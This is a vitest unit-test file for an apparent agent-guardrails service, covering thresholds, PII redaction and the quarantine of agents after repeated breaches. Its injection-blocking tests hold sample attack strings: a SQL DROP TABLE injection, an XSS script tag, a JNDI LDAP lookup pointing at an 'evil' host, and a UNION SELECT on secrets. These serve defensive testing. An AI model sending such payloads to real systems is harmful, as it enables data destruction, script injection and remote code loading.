/**
 * Dedicated unit tests for Sentinel's guardrails namespace (Phase 14 + 18.18 seam).
 * Exercises the real, exported API of guardrails.ts. No FROZEN files touched.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';

// Guardrails pulls in a heavy transitive chain (quarantine -> agent-permissions -> db).
// Cut that chain with mocks so we test only the pure registry + content-scan logic.
vi.mock('../src/services/reliability/quarantine.js', () => ({
  quarantineAgent: vi.fn(async () => ({ request: { status: 'active' } })),
  releaseQuarantine: vi.fn(),
}));
vi.mock('../src/services/siem-forwarder.js', () => ({
  forward: vi.fn(() => Promise.resolve({ ok: true })),
}));
vi.mock('../src/lib/audit.js', () => ({
  appendAudit: vi.fn(() => Promise.resolve()),
  Tx: class {},
}));
vi.mock('../src/db/client.js', () => ({
  db: {
    insert: vi.fn(() => ({ values: vi.fn(() => ({ returning: vi.fn(() => Promise.resolve([{ id: 'g1' }])) })) })),
    query: {
      guardrails: {
        findMany: vi.fn(() => Promise.resolve([])),
        findFirst: vi.fn(() => Promise.resolve(null)),
      },
    },
    update: vi.fn(() => ({ set: vi.fn(() => ({ where: vi.fn(() => Promise.resolve({})) })) })),
    delete: vi.fn(() => ({ where: vi.fn(() => Promise.resolve({})) })),
  },
}));

import {
  GuardrailThreshold,
  registerGuardrail,
  getGuardrailThreshold,
  listGuardrails,
  setGuardrailThreshold,
  assertWithinGuardrail,
  GuardrailViolation,
  reportGuardrailViolation,
  clearGuardrailViolation,
  resetGuardrailReport,
  getGuardrailReport,
  applyInputGuardrails,
  applyOutputGuardrails,
  seedDefaults,
} from '../src/services/guardrails.js';

const base: GuardrailThreshold = {
  id: 'test.tokens',
  metric: 'tokens',
  max: 1000,
  warnAt: 800,
  enabled: true,
};

beforeEach(() => {
  resetGuardrailReport();
  // clear registry by re-seeding known defaults (idempotent register)
  seedDefaults();
  registerGuardrail({ ...base });
});

describe('registerGuardrail / getGuardrailThreshold / listGuardrails', () => {
  it('registers a threshold and retrieves it', () => {
    expect(getGuardrailThreshold('test.tokens')?.max).toBe(1000);
  });

  it('lists registered thresholds', () => {
    const all = listGuardrails();
    expect(all.some((t) => t.id === 'test.tokens')).toBe(true);
    expect(all.some((t) => t.id === 'agent.tokens.per_run')).toBe(true);
  });
});

describe('setGuardrailThreshold (Pulse 18.18 seam)', () => {
  it('updates an existing threshold', () => {
    const next = setGuardrailThreshold('test.tokens', { max: 500 });
    expect(next.max).toBe(500);
    expect(getGuardrailThreshold('test.tokens')?.max).toBe(500);
  });

  it('throws on unknown guardrail', () => {
    expect(() => setGuardrailThreshold('nope', { max: 1 })).toThrow();
  });

  it('rejects inverted min/max range', () => {
    expect(() => setGuardrailThreshold('test.tokens', { min: 900, max: 100 })).toThrow();
  });

  it('merges partial updates without clobbering metric', () => {
    setGuardrailThreshold('test.tokens', { warnAt: 600 });
    const t = getGuardrailThreshold('test.tokens')!;
    expect(t.warnAt).toBe(600);
    expect(t.metric).toBe('tokens');
  });
});

describe('assertWithinGuardrail', () => {
  it('allows when value within max', () => {
    const r = assertWithinGuardrail('test.tokens', 500);
    expect(r.allowed).toBe(true);
    expect(r.level).toBe('ok');
  });

  it('warns at warnAt threshold', () => {
    const r = assertWithinGuardrail('test.tokens', 850);
    expect(r.allowed).toBe(true);
    expect(r.level).toBe('warn');
  });

  it('blocks when value exceeds max', () => {
    const r = assertWithinGuardrail('test.tokens', 1500);
    expect(r.allowed).toBe(false);
    expect(r.level).toBe('block');
  });

  it('treats unknown/disabled as allowed', () => {
    expect(assertWithinGuardrail('missing.id', 99999).allowed).toBe(true);
  });
});

describe('input guardrails (injection blocking)', () => {
  it('blocks SQL injection attempts', () => {
    const r = applyInputGuardrails("'; DROP TABLE users; --");
    expect(r.blocked).toBe(true);
    expect(r.allowed).toBe(false);
  });

  it('blocks reflected XSS', () => {
    const r = applyInputGuardrails('<script>alert(1)</script>');
    expect(r.blocked).toBe(true);
  });

  it('blocks template/command injection', () => {
    const r = applyInputGuardrails('${jndi:ldap://evil}');
    expect(r.blocked).toBe(true);
  });

  it('allows benign input', () => {
    const r = applyInputGuardrails('Please summarize the quarterly report.');
    expect(r.allowed).toBe(true);
    expect(r.blocked).toBe(false);
  });

  it('increments the input-blocked report counter', () => {
    const before = getGuardrailReport().inputBlocked;
    applyInputGuardrails('UNION SELECT * FROM secrets');
    expect(getGuardrailReport().inputBlocked).toBe(before + 1);
  });
});

describe('output guardrails (PII redaction)', () => {
  it('redacts email addresses', () => {
    const out = applyOutputGuardrails('Contact alice@example.com for help');
    expect(out).not.toContain('alice@example.com');
    expect(out).toContain('[REDACTED');
  });

  it('redacts SSNs', () => {
    const out = applyOutputGuardrails('SSN 123-45-6789 on file');
    expect(out).not.toContain('123-45-6789');
  });

  it('redacts phone numbers', () => {
    const out = applyOutputGuardrails('Call 415-555-2671 now');
    expect(out).not.toContain('415-555-2671');
  });

  it('increments the output-redacted counter', () => {
    const before = getGuardrailReport().outputRedacted;
    applyOutputGuardrails('email@x.com and ssn 111-22-3333');
    expect(getGuardrailReport().outputRedacted).toBeGreaterThan(before);
  });
});

describe('reportGuardrailViolation + self-heal escalation', () => {
  it('escalates severity with repeated breaches', async () => {
    const v: GuardrailViolation = { agentId: 'a1', guardrailId: 'g', value: 10 };
    const r1 = await reportGuardrailViolation(v);
    expect(['warn', 'error']).toContain(r1.severity);
    const r2 = await reportGuardrailViolation(v);
    expect(['error', 'critical']).toContain(r2.severity);
  });

  it('quarantines an agent after 5 breaches', async () => {
    const v: GuardrailViolation = { agentId: 'bad', guardrailId: 'g', value: 10 };
    let last = { quarantined: false, severity: 'warn' as const };
    for (let i = 0; i < 5; i++) last = await reportGuardrailViolation(v);
    expect(last.severity).toBe('critical');
    expect(last.quarantined).toBe(true);
  });

  it('clearGuardrailViolation resets the breach window', async () => {
    const v: GuardrailViolation = { agentId: 'c1', guardrailId: 'g', value: 10 };
    await reportGuardrailViolation(v);
    clearGuardrailViolation('c1', 'g');
    const r = await reportGuardrailViolation(v);
    expect(r.severity).toBe('warn');
  });
});
